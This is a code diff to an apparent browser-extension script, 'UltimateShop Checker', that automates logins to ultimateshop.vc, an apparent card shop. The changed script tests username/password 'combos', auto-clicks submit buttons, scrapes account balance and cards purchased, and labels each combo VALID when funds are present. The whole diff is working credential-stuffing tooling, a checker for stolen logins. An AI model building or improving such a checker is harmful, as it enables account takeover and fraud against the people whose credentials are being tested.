@@ -59,11 +59,12 @@ function isLoginPage() {
 
 // Check if we're on the success page (after login)
 function isSuccessPage() {
-    // Old working method: check for "Discount :" text
+    // Old working method: check for /news URL + "Discount :" text
+    const hasNewsUrl = window.location.href.includes('/news');
     const hasDiscountText = document.body.innerText.includes('Discount :');
     
-    if (hasDiscountText) {
-        console.log('UltimateShop Checker: SUCCESS KEY FOUND: "Discount :" detected!');
+    if (hasNewsUrl && hasDiscountText) {
+        console.log('UltimateShop Checker: SUCCESS KEY FOUND: /news + "Discount :" detected!');
         return true;
     }
     
@@ -105,10 +106,21 @@ function extractProfileData() {
             cardsPurchased = cardsRow.nextElementSibling.textContent.trim();
         }
 
+        // Combo Check Logic (from old working version)
+        let comboCheck = 'INVALID';
+        if (balance !== '0.00' && balance !== '0.00 $') {
+            comboCheck = 'VALID';
+        }
+
+        // Total Captures (Cards Purchased)
+        let totalCaptures = cardsPurchased;
+
         return {
             balance,
             totalSpent,
-            cardsPurchased
+            cardsPurchased,
+            comboCheck,
+            totalCaptures
         };
     } catch (error) {
         console.error('Error extracting profile data:', error);
@@ -283,6 +295,17 @@ function isCaptchaVisible() {
            captchaImg.naturalWidth > 0 &&
            captchaImg.offsetWidth > 0 &&
            captchaImg.offsetHeight > 0;
+}
+
+// Handle confirm button if present
+function handleConfirmButton() {
+    const confirmButton = document.querySelector('button[type="submit"], input[type="submit"], .btn');
+    if (confirmButton) {
+        console.log('UltimateShop Checker: Found confirm button, clicking...');
+        confirmButton.click();
+        return true;
+    }
+    return false;
 }
 
 // Perform the full login automation on the login page
@@ -503,17 +526,15 @@ function handlePage() {
             }
         }
     } else if (isSuccessPage()) {
-        console.log('UltimateShop Checker: Login successful! Redirecting to profile...');
+        console.log('UltimateShop Checker: Login successful! Navigating to profile...');
         console.log('UltimateShop Checker: Current URL:', window.location.href);
         
         // Clear the checking flag
         isChecking = false;
         
-        // Simple navigation to profile - what was working before
-        console.log('UltimateShop Checker: Navigating to profile page...');
-        window.location.href = 'https://ultimateshop.vc/profile';
-        
-        console.log('UltimateShop Checker: Navigation initiated');
+        // Old working method: use setTimeout and navigateToProfile
+        console.log('UltimateShop Checker: Using old working navigation method...');
+        setTimeout(navigateToProfile, 2000);
         
     } else if (isProfilePage()) {
         console.log('UltimateShop Checker: On profile page, extracting data...');
@@ -533,7 +554,9 @@ function handlePage() {
                 password,
                 balance: profileData.balance,
                 totalSpent: profileData.totalSpent,
-                cardsPurchased: profileData.cardsPurchased
+                cardsPurchased: profileData.cardsPurchased,
+                comboCheck: profileData.comboCheck,
+                totalCaptures: profileData.totalCaptures
             });
             sessionStorage.removeItem('current_username');
             sessionStorage.removeItem('current_password');
@@ -629,29 +652,3 @@ setInterval(() => {
         window.location.reload();
     }
 }, 30000); // 30 seconds
-
-// Monitor success key during navigation
-function monitorSuccessKey() {
-    let checkCount = 0;
-    const maxChecks = 10; // Check for 10 seconds
-    
-    const checkInterval = setInterval(() => {
-        checkCount++;
-        
-        // Old working method: check for "Discount :" text
-        const hasDiscount = document.body.innerText.includes('Discount :');
-        
-        console.log(`UltimateShop Checker: Success key monitoring (${checkCount}/${maxChecks}): "Discount :" present = ${hasDiscount}`);
-        
-        if (checkCount >= maxChecks) {
-            clearInterval(checkInterval);
-            console.log('UltimateShop Checker: Success key monitoring completed');
-        }
-    }, 1000);
-}
-
-// Add success key monitoring to success page handler
-function addSuccessKeyMonitoring() {
-    console.log('UltimateShop Checker: Starting success key monitoring...');
-    monitorSuccessKey();
-}
